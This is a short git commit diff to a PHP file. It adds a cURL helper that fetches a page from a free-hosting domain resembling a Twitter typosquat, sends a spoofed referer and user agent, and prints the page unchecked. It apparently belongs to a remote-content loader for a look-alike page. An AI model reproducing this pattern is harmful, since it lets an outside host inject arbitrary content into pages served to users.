0e8ac3fa031f4882e581cf40cb789107767d4b2f
zahranuupp <47617189+zahranuupp@users.noreply.github.com>
2019-02-25 14:22:11 +0300

    Update userdeck.php

--- userdeck.php
+++ userdeck.php
@@ -1,9 +1,26 @@
 
+<?php
+
+function curl_site($Url){ 
+  
+    if (!function_exists('curl_init')){ 
+        die('Üzgünüm.Curl yüklü değil!'); 
+    } 
+
+    $ch = curl_init(); 
+    curl_setopt($ch, CURLOPT_URL, $Url); 
+    curl_setopt($ch, CURLOPT_REFERER, "http://google.com"); 
+    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla vs."); 
+    curl_setopt($ch, CURLOPT_HEADER, 0); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); 
+    $output = curl_exec($ch); 
+    curl_close($ch); 
+    return $output; 
+}  
 
 
-<?php echo file_get_contents("https://twilter-post-source.000webhostapp.com/usergrid.php");
-
-echo $kulad;
+print curl_site('https://twilter-post-source.000webhostapp.com/usergrid.php'); 
 
 ?>
 
